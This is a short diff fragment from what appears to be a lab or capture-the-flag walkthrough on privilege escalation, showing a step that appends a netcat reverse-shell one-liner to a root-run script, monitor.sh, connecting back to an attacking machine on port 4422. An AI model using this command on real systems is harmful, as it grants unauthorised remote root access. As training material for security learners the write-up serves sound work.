@@ -75,6 +75,7 @@ If we cannot overwrite the file we could rename it, remove it, zip it or make my
 The concept when a file runs as root is to add code(reverse-shell).
 
 Add a reverse shell to monitor.sh.
+
 **echo “rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacking machine>  4422 > /tmp/f” >> monitor.sh**
  
 ![ni10](https://user-images.githubusercontent.com/15195048/93920497-1be4f200-fcc4-11ea-92ea-ab147316aa7a.png)
